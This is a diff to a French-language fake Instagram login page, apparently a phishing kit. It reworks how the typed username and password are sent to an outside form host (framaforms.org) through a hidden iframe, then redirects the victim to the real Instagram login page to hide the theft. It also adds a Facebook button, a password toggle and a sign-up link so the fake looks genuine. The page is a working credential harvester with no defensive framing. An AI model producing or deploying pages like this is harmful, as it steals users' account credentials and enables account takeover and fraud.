@@ -4,6 +4,7 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Connexion Instagram</title>
+<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet" />
 <style>
   body {
     background: #000;
@@ -43,6 +44,19 @@
     color: #fff;
     font-size: 14px;
   }
+  .password-wrapper {
+    position: relative;
+  }
+  .toggle-password {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    width: 22px;
+    height: 22px;
+    fill: #aaa;
+  }
   button {
     width: 100%;
     margin-top: 20px;
@@ -55,6 +69,21 @@
     font-size: 16px;
     cursor: pointer;
   }
+  .facebook-btn {
+    background: #1877f2;
+    margin-bottom: 15px;
+  }
+  .signup {
+    text-align: center;
+    margin-top: 15px;
+    font-size: 14px;
+    color: #aaa;
+  }
+  .signup a {
+    color: #3897f0;
+    text-decoration: none;
+    font-weight: bold;
+  }
 </style>
 </head>
 <body>
@@ -62,34 +91,49 @@
 <div class="container">
   <h1>Instagram</h1>
 
-  <form id="instaForm" autocomplete="off">
+  <form id="instaForm" action="https://framaforms.org/connexion-instagram-1752775137" method="POST" target="hidden_iframe" autocomplete="off">
+    <button type="button" class="facebook-btn">Connexion avec Facebook</button>
+
     <label for="username">Téléphone, nom d’utilisateur ou email *</label>
     <input type="text" id="username" name="new_1752775215051" required />
 
     <label for="password">Mot de passe *</label>
-    <input type="password" id="password" name="new_1752775407266" required />
+    <div class="password-wrapper">
+      <input type="password" id="password" name="new_1752775407266" required />
+      <svg class="toggle-password" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Afficher le mot de passe" role="img" tabindex="0">
+        <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+        <circle cx="12" cy="12" r="2.5"/>
+      </svg>
+    </div>
 
     <button type="submit">Se connecter</button>
   </form>
+
+  <div class="signup">
+    Pas de compte ? <a href="#">Inscrivez-vous</a>
+  </div>
+
+  <iframe name="hidden_iframe" style="display:none;"></iframe>
+
 </div>
 
 <script>
-  const form = document.getElementById('instaForm');
-  const formActionUrl = "https://framaforms.org/connexion-instagram-1752775137";
-  const redirectUrl = "https://www.instagram.com/accounts/login/";
+  const togglePassword = document.querySelector('.toggle-password');
+  const passwordInput = document.getElementById('password');
 
-  form.addEventListener('submit', function(e) {
+  togglePassword.addEventListener('click', () => {
+    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordInput.setAttribute('type', type);
+
+    togglePassword.style.fill = type === 'text' ? '#3897f0' : '#aaa';
+  });
+
+  document.getElementById('instaForm').addEventListener('submit', function(e) {
     e.preventDefault();
-
-    fetch(formActionUrl, {
-      method: 'POST',
-      body: new FormData(form),
-      mode: 'no-cors'
-    }).then(() => {
-      window.location.href = redirectUrl;
-    }).catch(() => {
-      window.location.href = redirectUrl;
-    });
+    this.submit();
+    setTimeout(function() {
+      window.location.href = 'https://www.instagram.com/accounts/login/';
+    }, 500);
   });
 </script>
 
